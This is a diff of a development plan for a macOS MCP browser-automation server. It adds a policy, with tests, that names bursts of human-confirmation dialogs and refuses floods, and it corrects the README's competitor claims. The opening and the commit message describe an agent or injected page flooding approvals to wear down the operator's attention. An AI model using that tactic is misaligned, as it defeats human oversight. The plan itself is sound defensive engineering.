+`grep -niE 'rateLimit|cooldown|throttl'` over `Sources/WebKitUIMCPServer` returns nothing. On a product whose safety rests on a human reading a dialog, an agent — or an injected page driving one — can raise fifty confirmations in a row and train the operator to click through. OWASP files this as the clickthrough vulnerability, and it is gap 4 in the security research.
+
+The fix is not to refuse; it is to make a burst visible and to slow it. A pure policy type decides, so it is testable without AppKit.
 
 **Files:**
-- Modify: `Sources/WebKitUIMCPRuntime/PinnedSOCKSProxy.swift` (metrics struct at line 5, `recordAccepted`/`recordBlocked` at lines 99–100)
-- Test: `Tests/WebKitUIMCPRuntimeTests/PinnedSOCKSProxyTests.swift`
+- Create: `Sources/WebKitUIMCPCore/ConfirmationRatePolicy.swift`
+- Create: `Tests/WebKitUIMCPCoreTests/ConfirmationRatePolicyTests.swift`
+- Modify: `Sources/WebKitUIMCPServer/MCPServer.swift`
+- Test: `Tests/WebKitUIMCPServerTests/MCPServerTests.swift`
 
 **Interfaces:**
-- Consumes: nothing.
-- Produces: `PinnedProxyMetrics.acceptedHosts: [String]`, `PinnedProxyMetrics.blockedHosts: [String]`, `PinnedProxyMetrics.hostsDropped: Int`, and `PinnedProxyMetrics.maximumRecordedHosts` = 50.
+- Produces: `ConfirmationRatePolicy` with `mutating func record(atMonotonicNanoseconds:) -> ConfirmationRatePolicy.Verdict`, `Verdict` being `.normal`, `.burst(recentCount: Int)` or `.refuse(recentCount: Int)`; `burstThreshold` = 5, `refuseThreshold` = 20, `window` = 60 seconds.
 
-- [ ] **Step 1: Read the two call sites before changing their signatures**
+- [ ] **Step 1: Write the failing unit test**
 
-```bash
-sed -n 90,120p Sources/WebKitUIMCPRuntime/PinnedSOCKSProxy.swift
-grep -n 'recordAccepted\|recordBlocked' Sources/WebKitUIMCPRuntime/PinnedSOCKSProxy.swift
-```
-
-Note every caller. Each needs a host argument; the compiler will name any you miss.
-
-- [ ] **Step 2: Write the failing test**
-
-In `Tests/WebKitUIMCPRuntimeTests/PinnedSOCKSProxyTests.swift`, add at the end of the existing suite:
+Create `Tests/WebKitUIMCPCoreTests/ConfirmationRatePolicyTests.swift`:
 
 ```swift
-  @Test("The metrics name the hosts allowed and refused, bounded and without duplicates")
-  func metricsNameTheHosts() {
-    var metrics = PinnedProxyMetrics()
-    metrics.recordAccepted(host: "example.test")
-    metrics.recordAccepted(host: "example.test")
-    metrics.recordBlocked(host: "10.9.8.8")
+import Foundation
+import Testing
 
-    #expect(metrics.acceptedHosts == ["example.test"], "a repeat visit is not a new host")
-    #expect(metrics.blockedHosts == ["10.9.8.8"])
-    #expect(metrics.acceptedConnections == 2, "the counter still counts every connection")
-    #expect(metrics.blockedConnections == 1)
-    #expect(metrics.hostsDropped == 0)
-  }
+@testable import WebKitUIMCPCore
 
-  @Test("A page contacting hundreds of hosts cannot grow the record without bound")
-  func hostRecordIsBounded() {
-    var metrics = PinnedProxyMetrics()
-    for index in 0..<(PinnedProxyMetrics.maximumRecordedHosts + 10) {
-      metrics.recordAccepted(host: "host\(index).test")
+@Suite("Confirmation rate policy")
+struct ConfirmationRatePolicyTests {
+  private let second: UInt64 = 1_000_000_000
+
+  @Test("Ordinary work is never slowed")
+  func ordinaryWorkIsNormal() {
+    var policy = ConfirmationRatePolicy()
+    for index in 0..<4 {
+      #expect(policy.record(atMonotonicNanoseconds: UInt64(index) * 5 * second) == .normal)
     }
-
-    #expect(metrics.acceptedHosts.count == PinnedProxyMetrics.maximumRecordedHosts)
-    #expect(metrics.hostsDropped == 10)
-    #expect(metrics.acceptedHosts.first == "host0.test", "the first hosts are the interesting ones")
-  }
-```
-
-- [ ] **Step 3: Run them to verify they fail**
-
-```bash
-swift test --arch arm64 --no-parallel --filter 'metricsNameTheHosts|hostRecordIsBounded'
-```
-
-Expected: FAIL to compile, `has no member 'recordAccepted'` on `PinnedProxyMetrics`.
-
-- [ ] **Step 4: Write the minimal implementation**
-
-Replace the struct at `Sources/WebKitUIMCPRuntime/PinnedSOCKSProxy.swift:5` with:
-
-```swift
-/// What the egress boundary did, in aggregate and by host.
-///
-/// The counters alone made the network-boundary contract auditable only as totals: a
-/// client could see that something was blocked but never what. The host lists are
-/// bounded, deduplicated and keep the earliest entries, because the first refusal is the
-/// one that explains a failure.
-public struct PinnedProxyMetrics: Codable, Equatable, Sendable {
-  public static let maximumRecordedHosts = 50
-
-  public var acceptedConnections = 0
-  public var blockedConnections = 0
-  public var pinnedHosts = 0
-  public var timedOutConnections = 0
-  public private(set) var acceptedHosts: [String] = []
-  public private(set) var blockedHosts: [String] = []
-  /// Distinct hosts the record could not hold, so a reader is told it is partial.
-  public private(set) var hostsDropped = 0
-
-  public init() {}
-
-  public mutating func recordAccepted(host: String) {
-    acceptedConnections += 1
-    remember(host, in: &acceptedHosts)
   }
 
-  public mutating func recordBlocked(host: String) {
-    blockedConnections += 1
-    remember(host, in: &blockedHosts)
-  }
-
-  private mutating func remember(_ host: String, in list: inout [String]) {
-    guard !host.isEmpty, !list.contains(host) else { return }
-    guard list.count < Self.maximumRecordedHosts else {
-      hostsDropped += 1
-      return
+  @Test("A burst is named, with how many confirmations it counted")
+  func burstIsNamed() {
+    var policy = ConfirmationRatePolicy()
+    var verdict = ConfirmationRatePolicy.Verdict.normal
+    for index in 0..<ConfirmationRatePolicy.burstThreshold {
+      verdict = policy.record(atMonotonicNanoseconds: UInt64(index) * second / 2)
     }
-    list.append(host)
+    #expect(verdict == .burst(recentCount: ConfirmationRatePolicy.burstThreshold))
+  }
+
+  @Test("A flood is refused rather than shown")
+  func floodIsRefused() {
+    var policy = ConfirmationRatePolicy()
+    var verdict = ConfirmationRatePolicy.Verdict.normal
+    for index in 0..<ConfirmationRatePolicy.refuseThreshold {
+      verdict = policy.record(atMonotonicNanoseconds: UInt64(index) * second / 10)
+    }
+    #expect(verdict == .refuse(recentCount: ConfirmationRatePolicy.refuseThreshold))
+  }
+
+  @Test("The window forgets, so a long session is not punished for its past")
+  func windowForgets() {
+    var policy = ConfirmationRatePolicy()
+    for index in 0..<ConfirmationRatePolicy.refuseThreshold {
+      _ = policy.record(atMonotonicNanoseconds: UInt64(index) * second / 10)
+    }
+    // Well past the window.
+    #expect(policy.record(atMonotonicNanoseconds: 600 * second) == .normal)
   }
 }
 ```
 
-- [ ] **Step 5: Update the two call sites**
+- [ ] **Step 2: Run it to verify it fails**
 
-The existing helpers at lines 99–100 increment the counters directly. Replace them so the counting lives in one place:
+```bash
+swift test --arch arm64 --no-parallel --filter ConfirmationRatePolicyTests
+```
+
+Expected: FAIL to compile.
+
+- [ ] **Step 3: Write the minimal implementation**
+
+Create `Sources/WebKitUIMCPCore/ConfirmationRatePolicy.swift`:
 
 ```swift
-  fileprivate func recordAccepted(host: String) { metrics.recordAccepted(host: host) }
-  fileprivate func recordBlocked(host: String) { metrics.recordBlocked(host: host) }
+import Foundation
+
+/// How many confirmations have been asked for recently.
+///
+/// The safety of this product rests on a human reading a dialog. An agent, or an
+/// injected page driving one, can ask fifty times in a minute and train the operator to
+/// click through; OWASP files that as the clickthrough vulnerability. Refusing outright
+/// would break ordinary work, so a burst is named in the dialog and a flood is refused.
+public struct ConfirmationRatePolicy: Equatable, Sendable {
+  public enum Verdict: Equatable, Sendable {
+    case normal
+    /// Show the count in the dialog. An operator who is told this is the ninth request
+    /// in a minute has the one fact that makes a flood legible.
+    case burst(recentCount: Int)
+    /// Do not present. Return an error naming the count.
+    case refuse(recentCount: Int)
+  }
+
+  public static let burstThreshold = 5
+  public static let refuseThreshold = 20
+  public static let windowNanoseconds: UInt64 = 60_000_000_000
+
+  private var recent: [UInt64] = []
+
+  public init() {}
+
+  public mutating func record(atMonotonicNanoseconds now: UInt64) -> Verdict {
+    recent.removeAll { now >= $0 && now - $0 > Self.windowNanoseconds }
+    recent.append(now)
+    let count = recent.count
+    if count >= Self.refuseThreshold { return .refuse(recentCount: count) }
+    if count >= Self.burstThreshold { return .burst(recentCount: count) }
+    return .normal
+  }
+}
 ```
 
-Build to find every caller and pass the host each already has in scope — `pinnedAddress(for host:)` and `connect(host:port:)` both carry it:
+- [ ] **Step 4: Run it to verify it passes**
 
 ```bash
-swift build --arch arm64 2>&1 | grep -E 'error|warning' | head
+swift test --arch arm64 --no-parallel --filter ConfirmationRatePolicyTests
 ```
 
-Where a call site genuinely has no host in scope, pass the SOCKS request's target rather than inventing a placeholder; if that is impossible, leave that path calling only the counter and say so in the commit message.
+Expected: PASS, 4 tests.
 
-- [ ] **Step 6: Run the tests to verify they pass**
+- [ ] **Step 5: Wire it into the server, and only into the native path**
+
+The MCP elicitation path is the client's own UI and already subject to whatever the client does. Apply this where the server presents its own dialog. Find the presenter call:
 
 ```bash
-swift test --arch arm64 --no-parallel --filter 'metricsNameTheHosts|hostRecordIsBounded'
-swift test --arch arm64 --no-parallel --filter '^WebKitUIMCPRuntimeTests\.'
+grep -n 'confirmationPresenter' Sources/WebKitUIMCPServer/MCPServer.swift | head
 ```
 
-Expected: both new tests PASS and the runtime bundle still prints its summary with no failures. The existing proxy tests assert on `acceptedConnections` and `blockedConnections`; those counters are unchanged.
+Add one `ConfirmationRatePolicy` per session, consult it immediately before presenting, and:
 
-- [ ] **Step 7: Lint and commit**
+- `.normal` — present unchanged.
+- `.burst(let count)` — prepend one line to the message: `"This is request \(count) in the last minute."`
+- `.refuse(let count)` — do not present; throw an error whose message names the count and says to wait, so the agent learns rather than retries blindly.
+
+- [ ] **Step 6: Write the failing server test and make it pass**
+
+```swift
+  @Test("A flood of confirmations is refused instead of shown")
+  func confirmationFloodIsRefused() async throws {
+    // Twenty dialogs in a minute is not a workflow; it is an attempt to make the human
+    // stop reading. The refusal names the count so the agent is told why.
+    let registry = try WebKitSessionRegistry()
+    let handle = try registry.open()
+    let runtime = try registry.runtime(for: handle)
+    runtime.webView.loadHTMLString(
+      "<button>Save</button>", baseURL: URL(string: "https://example.test/start"))
+    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
+    let presenter = ConfirmationPresenterStub(
+      responses: Array(repeating: false, count: ConfirmationRatePolicy.refuseThreshold))
+    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
+
+    var lastError: JSONValue?
+    for index in 0..<(ConfirmationRatePolicy.refuseThreshold + 1) {
+      let observed = try await toolCall(
+        server, id: Int64(1000 + index * 2), name: "browser_observe",
+        arguments: ["session_id": .string(handle.rawValue.uuidString)])
+      let observation = try object(try object(observed["result"])["structuredContent"])
+      let target = try object(try array(observation["elements"]).first)
+      let acted = try await toolCall(
+        server, id: Int64(1001 + index * 2), name: "browser_act",
+        arguments: [
+          "session_id": .string(handle.rawValue.uuidString),
+          "observation_id": .string(try string(observation["observationID"])),
+          "element_id": .string(try string(target["elementID"])),
+          "operation": .string("click"),
+          "idempotency_key": .string("flood-\(index)"),
+          "postcondition": .object([
+            "type": .string("url_equals"), "value": .string("https://example.test/done"),
+          ]),
+        ])
+      lastError = acted["error"]
+    }
+
+    let error = try object(lastError)
+    #expect(try string(error["message"]).contains("in the last minute"))
+    #expect(
+      presenter.requests.count <= ConfirmationRatePolicy.refuseThreshold,
+      "the flood was presented to the operator instead of refused")
+  }
+```
+
+- [ ] **Step 7: Full suite, lint, commit**
 
 ```bash
 xcrun swift-format lint --strict --recursive Sources Tests Package.swift
-git add Sources/WebKitUIMCPRuntime/PinnedSOCKSProxy.swift \
-  Tests/WebKitUIMCPRuntimeTests/PinnedSOCKSProxyTests.swift
+swift test --arch arm64 --no-parallel --skip hostExclusiveSession
+git add Sources/WebKitUIMCPCore/ConfirmationRatePolicy.swift \
+  Tests/WebKitUIMCPCoreTests/ConfirmationRatePolicyTests.swift \
+  Sources/WebKitUIMCPServer/MCPServer.swift \
+  Tests/WebKitUIMCPServerTests/MCPServerTests.swift
 git commit -F - <<'EOF'
-feat: name the hosts the egress boundary allowed and refused
+feat: name a burst of confirmations and refuse a flood
 
-The network-boundary contract was auditable only as totals: a client could see
-that a connection was blocked and never which host. The proxy metrics now carry
-bounded, deduplicated accepted and blocked host lists with an explicit dropped
-count, keeping the earliest entries because the first refusal is the one that
-explains a failure. The existing counters are unchanged.
+Nothing limited how often this product could ask a human to approve something,
+and its whole safety argument is that the human reads the dialog. Twenty requests
+in a minute is not a workflow; it is an attempt to make the operator stop reading,
+and OWASP files it as the clickthrough vulnerability.
+
+From the fifth request in a minute the dialog states which request it is, which
+is the one fact that makes a flood legible. From the twentieth the request is
+refused with an error naming the count, so the agent is told why instead of
+retrying blindly. The window forgets, so a long session is not punished for its
+past. Only the server's own dialog is governed; the MCP elicitation path is the
+client's own interface.
+
+Evidence: docs/research/2026-09-09-agentic-browser-security-sota.md, gap 4.
 
 Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
 Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
@@ -1042,18 +947,14 @@ EOF
 
 ---
 
-## Task 5: State the Apple comparison and the refusals in the documentation
+## Task 4: Publish only what the research supports
 
-The comparison currently lives in a Reddit reply. The parent spec's "P1 — product experience" asked for a neutral comparison with Playwright MCP and cloud services; Apple's first-party server replaces that as the comparison that matters, and the refusals — no JavaScript tool, no multi-tab, no subresource inspection — are the product, so they belong beside the promise rather than in a thread.
+Four published claims were refuted. The comparison with Apple's server currently exists only in a forum reply, and the refusals — which are the product — are not stated next to the promise.
 
 **Files:**
-- Modify: `README.md` (refusal list at line 73, deliberate-limits section beginning line 64)
+- Modify: `README.md`
 - Modify: `docs/network-boundary.md`
 - Modify: `Tests/WebKitUIMCPServerTests/CapabilityClaimsCoherenceTests.swift`
-
-**Interfaces:**
-- Consumes: `CapabilityClaimsCoherenceTests` from Task 1.
-- Produces: nothing further.
 
 - [ ] **Step 1: Write the failing test**
 
@@ -1065,117 +966,126 @@ Add to `CapabilityClaimsCoherenceTests`:
       contentsOf: projectRoot.appendingPathComponent(relativePath), encoding: .utf8)
   }
 
-  @Test("The README names every capability this product refuses")
+  @Test("The README names every capability this product refuses, and why")
   func refusalsAreDocumented() throws {
     let readme = try Self.text("README.md")
-    // Each of these is a decision a reader will otherwise mistake for an oversight,
-    // especially now that Apple's first-party server offers them.
-    for refusal in [
-      "arbitrary JavaScript",
-      "raw CDP escape hatch",
-      "subresource",
-      "multiple tabs",
-    ] {
+    for refusal in ["arbitrary JavaScript", "raw CDP escape hatch", "subresource", "tabs"] {
       #expect(readme.contains(refusal), "README no longer explains refusing: \(refusal)")
     }
   }
 
-  @Test("The network boundary document says subresource inspection is not offered")
-  func networkBoundaryStatesTheCeiling() throws {
-    let boundary = try Self.text("docs/network-boundary.md")
-    #expect(boundary.contains("subresource"))
+  @Test("The README makes no claim the research refuted")
+  func refutedClaimsAreAbsent() throws {
+    let readme = try Self.text("README.md")
+    // Each of these was published and is false. safaridriver dispatches NSEvent through
+    // [window sendEvent:] exactly as this does; Claude in Chrome shipped per-action
+    // approval first; Browserbase exposes six tools with no evaluate; and WebKit does
+    // expose subresource inspection, through proxyConfigurations and WKWebExtension.
+    for claim in [
+      "only MCP browser", "first to", "unique in", "no API for inspecting",
+      "hashed prefixes",
+    ] {
+      #expect(!readme.contains(claim), "README makes a refuted claim: \(claim)")
+    }
   }
 ```
 
-- [ ] **Step 2: Run them to verify they fail**
+- [ ] **Step 2: Run it to verify it fails**
 
 ```bash
-swift test --arch arm64 --no-parallel --filter 'refusalsAreDocumented|networkBoundaryStatesTheCeiling'
+swift test --arch arm64 --no-parallel --filter 'refusalsAreDocumented|refutedClaimsAreAbsent'
 ```
 
-Expected: FAIL, naming `subresource` and `multiple tabs` as missing.
+Expected: FAIL on `subresource` and `tabs`.
 
-- [ ] **Step 3: Extend the README's deliberate limits**
+- [ ] **Step 3: Rewrite the deliberate limits**
 
-In `README.md`, replace the line
+In `README.md`, replace the single refusal line with:
 
-```
-- No arbitrary JavaScript, raw CDP escape hatch, coordinate retry, proxy fleet, anti-bot bypass, or headless claim.
-```
-
-with
-
-```
-- No arbitrary JavaScript, raw CDP escape hatch, coordinate retry, proxy fleet, anti-bot bypass, or headless claim. A gate an agent can step around is not a gate: a JavaScript-evaluation tool would let one call do anything the confirmation was meant to authorize one action at a time.
-- No multiple tabs. One session holds one exclusive host lease, which is what makes an approval refer to an unambiguous page.
-- No subresource or XHR network inspection. WebKit exposes no API for it, and the only route would be patching `fetch` and `XMLHttpRequest` inside the page, which the site can observe and falsify. The main frame's HTTP status is reported instead, and it comes from the navigation delegate rather than from the page.
+```markdown
+- No arbitrary JavaScript, raw CDP escape hatch, coordinate retry, proxy fleet, anti-bot bypass, or headless claim. A gate an agent can step around is not a gate: one JavaScript-evaluation call would do anything the confirmation exists to authorize one action at a time. Browserbase's MCP server also refuses JavaScript; the combination refused here is a JavaScript tool *and* a per-action gate *and* a real authenticated session.
+- No multiple tabs. One session holds one exclusive host lease, which is what lets an approval refer to an unambiguous page.
+- No subresource or XHR request inspection. It is possible — `WKWebsiteDataStore.proxyConfigurations` is public and Apple's own recommendation for reading WKWebView traffic, and a bundled `WKWebExtension` with `webRequest` is public from macOS 15.4 — and it is not offered. The proxy route needs a trusted root certificate to see HTTPS, and the extension route reports no headers. The main frame's HTTP status comes from the navigation delegate instead, and the egress proxy names the hosts it allowed and refused.
+- Native AppKit dispatch is not a distinguishing feature and is not claimed as one. `safaridriver` dispatches `NSEvent` through `[window sendEvent:]` exactly as this does, and the WebDriver specification requires every conformant driver to produce trusted events. What differs is the measurement: an action whose trusted DOM receipt is missing or mismatched fails indeterminate here, where Playwright's hit-target interceptor treats an absent event as success.
 ```
 
-- [ ] **Step 4: Add the Apple comparison**
+- [ ] **Step 4: Add the comparison, with only cited facts**
 
-In `README.md`, immediately after the `## Deliberate limits` section, add:
+After `## Deliberate limits`:
 
 ```markdown
 ## Compared with the Safari MCP server
 
-Apple's Safari MCP server (Safari 27 beta / Safari Technology Preview 247+) gives an
-agent fifteen tools against your real Safari, including JavaScript evaluation, network
-request inspection and console access, for seeing how a site you are building actually
-renders. For that job it is the better tool: it is first-party, free and it is Safari.
+Apple's Safari MCP server ships inside `safaridriver`, is started with
+`safaridriver --mcp`, and exposes seventeen tools — page content, screenshots, network
+requests, console logs, JavaScript evaluation, DOM interaction, viewport and media
+emulation, tab management. It needs "Show features for web developers" in Settings >
+Advanced and "Allow remote automation and external agents" in Settings > Developer. Apple
+aims it at web developers: it "gives your agent the ability to know how your code actually
+renders in the browser", and both sets of release notes file it under WebDriver > New
+Features. For developing a site it is the better tool, it is included with Safari, and
+this project does not compete with it.
 
-This project answers a different question — acting on sites you are already signed in
-to, where the failure that matters is not a broken layout but a click on the wrong
-control:
+The difference is what happens when the site is not yours and you are signed in to it:
 
 | | Safari MCP server | WebKitUI MCP |
 | --- | --- | --- |
 | Purpose | inspect and debug a site you are developing | act on a site you are signed in to |
-| Approval | none; autonomous once connected | native macOS confirmation before every exposed click and open-world navigation |
-| JavaScript evaluation | exposed as a tool | deliberately absent, with no CDP or coordinate fallback |
-| Browser | your real Safari, with *Allow remote automation and external agents* enabled in Settings | its own `WKWebView` and its own persistent profile |
-| Personal data | states it has no access to your Safari data | authenticated sessions are the point; passwords are released only through a local human handoff and never reach MCP |
-| Network detail | full request inspection through Web Inspector | main-frame HTTP status only, from the navigation delegate |
-| Verification | inspection tools | an explicit postcondition per action, plus separate `confirmation_mode`, `dispatch_mode` and `trusted_gesture_state` fields |
-| Requirements | macOS with Safari 27 beta or STP 247+ | macOS 15+ on Apple silicon, notarized |
+| Approval | no confirmation step is documented, and no tool requests one | native macOS confirmation before every exposed click and open-world navigation |
+| Tool annotations | none: every tool carries only `name`, `description`, `inputSchema`, so a client gets no signal separating page reading from JavaScript evaluation | `readOnlyHint` and `destructiveHint` per tool |
+| JavaScript evaluation | exposed as a tool | absent, with no CDP or coordinate fallback |
+| Session | Apple's WebDriver documentation states automation windows are "isolated from normal browsing windows, user settings, and preferences" and that a session "always starts from a clean slate" | its own `WKWebView` and its own persistent profile, which is what authenticated work requires |
+| Protocol | reports `2024-11-05` | `2026-07-28`, the current revision |
+| Network detail | full request inspection | main-frame HTTP status from the navigation delegate, and the hosts the egress proxy allowed or refused |
+| Verification | inspection tools | an explicit postcondition per action, plus separate `confirmation_mode`, `dispatch_mode` and `trusted_gesture_state` |
 
 Both can be installed at once, and for most developers both should be.
+
+Two things this project will not say about Apple's server, because Apple does not: that it
+cannot reach your cookies or your logged-in sessions — Apple's MCP post names AutoFill and
+"other browser activity" only — and that Apple states there is no confirmation step. The
+absence is documented; a denial is not.
 ```
 
-- [ ] **Step 5: State the ceiling in the network boundary document**
+- [ ] **Step 5: Correct the network boundary document**
 
-In `docs/network-boundary.md`, add to the list of things the boundary does not claim:
+In `docs/network-boundary.md`, in the list of things the boundary does not claim:
 
 ```
-- Per-subresource request inspection. WebKit exposes no such API to an embedder, and
-  patching `fetch` or `XMLHttpRequest` inside the page would report whatever the page
-  allowed us to see, so it is not offered. The main frame's HTTP status is reported from
-  the navigation delegate, and the proxy names the hosts it allowed and refused.
+- Per-subresource request inspection. It is not offered, and it is not impossible:
+  `WKWebsiteDataStore.proxyConfigurations` is public and is Apple's own recommendation
+  for reading WKWebView request contents, and a bundled `WKWebExtension` with the
+  `webRequest` permission is public from macOS 15.4. Neither is free — the proxy needs a
+  trusted root certificate to see inside HTTPS, and the extension route reports no
+  headers and cannot block. Until one is adopted, the main frame's HTTP status comes
+  from the navigation delegate and the proxy names the hosts it allowed and refused.
 ```
 
-- [ ] **Step 6: Run the tests to verify they pass**
+- [ ] **Step 6: Run, lint, commit**
 
 ```bash
 swift test --arch arm64 --no-parallel --filter '^WebKitUIMCPServerTests\.'
-```
-
-Expected: the bundle prints its summary and passes, including all four coherence tests.
-
-- [ ] **Step 7: Commit**
-
-```bash
+xcrun swift-format lint --strict --recursive Sources Tests Package.swift
 git add README.md docs/network-boundary.md \
   Tests/WebKitUIMCPServerTests/CapabilityClaimsCoherenceTests.swift
 git commit -F - <<'EOF'
-docs: say what this refuses, and how it differs from Apple's Safari MCP server
+docs: publish only what the research supports, and say what is refused
 
-Apple shipped a first-party MCP server that drives real Safari with fifteen
-tools, JavaScript evaluation among them. That makes the generic "drive a browser
-from an agent" claim worthless and the refusals load-bearing, so they are now
-stated next to the promise instead of in a forum reply: no JavaScript tool, no
-multiple tabs, no subresource inspection, each with the reason.
+Four published claims were refuted on 2026-09-09 and are now absent, pinned by a
+test that fails if any returns: native AppKit dispatch is not distinctive
+(safaridriver does the identical thing and the WebDriver specification requires
+trusted events); per-action approval is not a first (Claude in Chrome shipped it);
+refusing JavaScript is not unique (Browserbase exposes six tools with no
+evaluate); and "WebKit exposes no subresource-inspection API" is false —
+proxyConfigurations and WKWebExtension webRequest are both public, and the honest
+statement is that neither is offered and what each would cost.
 
-The comparison is neutral and says plainly that for developing a site theirs is
-the better tool. A coherence test fails if the README stops explaining a refusal.
+The comparison with Apple's server is stated from primary sources only:
+seventeen tools, the two settings and their panes, no documented confirmation
+step, no tool annotations at all, protocol 2024-11-05, and the WebDriver
+isolation wording attributed to Apple's WebDriver documentation rather than to
+the MCP announcement. Two tempting claims are explicitly not made, because Apple
+does not make them.
 
 Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
 Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
@@ -1184,43 +1094,34 @@ EOF
 
 ---
 
-## Final verification
+## Deferred, in order, and why
 
-- [ ] **Run the full gate**
+These were Tasks 2 to 4 of this plan's first version. They remain worth doing and are no longer first.
 
-```bash
-scripts/verify-native-installed.sh
-```
+1. **Main-frame HTTP status on the navigation result.** The delegate hook exists at `decidePolicyFor navigationResponse` and already reads `statusCode` for downloads; the result is encoded whole, so a defaulted `var` surfaces automatically. Add three caveats the research established: the cast must be conditional, redirect-hop statuses are unavailable in API and SPI alike, and the callback is skipped on back/forward-cache resumes.
+2. **Console and uncaught-error journal**, bounded and labelled untrusted site content. No official API exists — `_webView:didReceiveConsoleLogForTesting:` is SPI, named `ForTesting`, and delivers a flat string — so an injected forwarder in the instrumentation world is correct, and the page's own `console` stays unpatched.
+3. **Contacted and refused hosts on the proxy metrics.** Counters exist; the host lists do not.
 
-Expected: eight `Test run with` summaries across the debug and release passes, no failures, and either a green finish or the single known line `installed webkitui-mcp is not built from this source` — which is correct until a reinstall, and is the operator's decision.
+## Not in this plan
 
-- [ ] **Reinstall, only with fresh explicit approval**
+Each needs its own plan; none is code with a test cycle.
 
-Reinstalling replaces the app and three CLI binaries, quits the broker and drops live browser sessions. The procedure, unchanged from 2026-09-07:
+1. **Provider proof matrix** — dated, independently read-back journeys for Stripe, Google Play Console and Cloudflare. The parent spec's P0 exit gate and still the largest gap.
+2. **Physical-Mac authentication tests** — locked Mac, closed lid, Touch ID lockout, Apple Watch, password fallback, cancellation, timeout.
+3. **Intra-page trust segmentation** — the general form of Task 1. Prismata measures 85.5% to 0.7% attack success at 3.3 percentage points of utility. Task 1 closes the demonstrated instance; this closes the class.
+4. **Dataflow and capability tracking** — a secret read on origin A laundering into a form on origin B with every step approved. CaMeL, Fides, Progent.
+5. **Task-alignment checking** — a postcondition proves the outcome, never the intent.
+6. **Adversarial benchmarking** — this product has never been measured against any injection benchmark. Residual risk is unknown, not low: NIST/CAISI moved one system from 11% to 81% attack success by strengthening the attack alone.
+7. **Screenshot and OCR provenance** — the capture path sits outside the labelling scheme, and Brave demonstrated injections that are invisible to a human but not to a model.
+8. **`WKJSHandle` adoption (macOS 27)** — a durable, GC-protected reference to a live JavaScript object carrying `sourceFrame` and `contentWorld`, degrading to `undefined` when the frame navigates. The element-handle primitive WKWebView never had; the repository already carries a `WKJSHandleProbe` target.
+9. **Commercial and legal truth**, and an independent review of the gesture and credential boundary.
 
-```bash
-scripts/build-signed-local.sh <output-dir> \
-  8333AB7CD909731530AC62DD28CCA47C8D288225 TDV6D5L785
-```
-
-then quit the broker, move the app aside as `.rollback-<date>-<sha>`, `ditto` the new bundle in, copy and re-sign the three CLI tools, relaunch, and rerun the gate.
-
----
-
-## Out of scope for this plan
-
-These are the remaining SOTA gaps, and none of them is code with a test cycle, so each needs its own plan rather than a task here. They are the open items of `docs/2026-08-29-full-sota-product-plan.md`, still accurate:
-
-1. **Provider proof matrix** — one dated, independently read-back journey for Stripe, Google Play Console and Cloudflare, distinguishing verified, degraded, handoff-required and unsupported. This is the parent spec's P0 exit gate and the single largest gap.
-2. **Physical-Mac authentication tests** — interactive login, locked Mac, closed lid, Touch ID lockout, Apple Watch, password fallback, cancellation, timeout. No simulator or local run substitutes for these.
-3. **First-run diagnostic experience** — every failed `doctor` check explained with one recovery action.
-4. **Commercial and legal truth** — seller identity, terms, one paid live canary, cancellation, entitlement revocation, readable end to end. Every external mutation needs its own authorization.
-5. **Independent review of the native gesture and credential boundary** before Developer Preview is removed.
-
-A per-project auto-approval grant is deliberately absent from both lists. Its design constraints are in `docs/research/2026-09-01-goal-delegation-and-browser-addressing-sota.md`, it requires a shadow-mode campaign with zero false allows before activation, and the hard NO-GO classes — secrets, payments, sends, deletions, uploads, publication, cross-origin navigation — do not move.
+Per-project auto-approval stays out of both lists. Its constraints are in
+`docs/research/2026-09-01-goal-delegation-and-browser-addressing-sota.md`, it needs a
+shadow-mode campaign with zero false allows first, and the hard NO-GO classes do not move.
 
 ## Self-review
 
-- **Spec coverage.** The two parent-spec items this plan closes are "retain JavaScript fixtures only as explicitly private legacy validation assets" (Task 1) and the neutral competitor comparison under P1 product experience (Task 5). Tasks 2, 3 and 4 are new, caused by Apple's launch reframing what evidence the product must produce. Every other parent-spec item is listed under "Out of scope" with a reason.
-- **Placeholder scan.** No TBD, no "add error handling", no "similar to Task N". Three steps deliberately begin with a `grep` because the exact insertion site is in a 4800-line file and the anchor string, not a line number, is what stays correct: Task 2 step 10, Task 3 steps 10, 11 and 13, Task 4 step 5. Each names the string to search for and the exact code to add. Task 3 step 13 and Task 4 step 5 each state what to do if the expected helper or host is absent.
-- **Type consistency.** `NavigationResponseFacts.mainFrameHTTPStatus(isForMainFrame:response:)` is defined in Task 2 step 3 and consumed in step 9 with the same label order. `WebKitNavigationResult.mainFrameHTTPStatus` is declared `var` with no explicit default in step 7 so the memberwise initializer keeps every existing construction site compiling, and step 10 relies on that. `ConsoleJournal.Level` cases `log/info/warn/error/uncaught` match the JavaScript array `['log','info','warn','error']` plus the two `'uncaught'` forwarders in step 10, and the `Level(rawValue:)` decode in step 9. `ConsoleJournal.Line.truncated` is asserted in the test at step 1 and set in the implementation at step 3. `PinnedProxyMetrics.recordAccepted(host:)` / `recordBlocked(host:)` replace the no-argument `fileprivate` helpers, and Task 4 step 5 accounts for the call sites.
+- **Spec coverage.** The refuted claims each have a task: dispatch distinctiveness, JavaScript uniqueness, subresource impossibility and the fraud-check mechanism (already committed in `6ce4807`). The security research's gap 1 has Task 1 for the demonstrated instance and a deferred entry for the class; gap 4 has Task 3. Gaps 2, 3, 5, 6 and 7 are listed as needing their own plans, with reasons.
+- **Placeholder scan.** No TBD and no "add error handling". Five steps open with a `grep` because the insertion point sits in a file of nearly five thousand lines where an anchor string stays correct and a line number does not: Task 1 steps 5, 9 and 11, Task 2 step 6, Task 3 step 5. Each names the string to find and the exact code to add. Task 1 step 7 states what to do if `ConfirmationPresenterStub` records a different shape; Task 2 step 8 states what to do when the Mac is not on macOS 27.
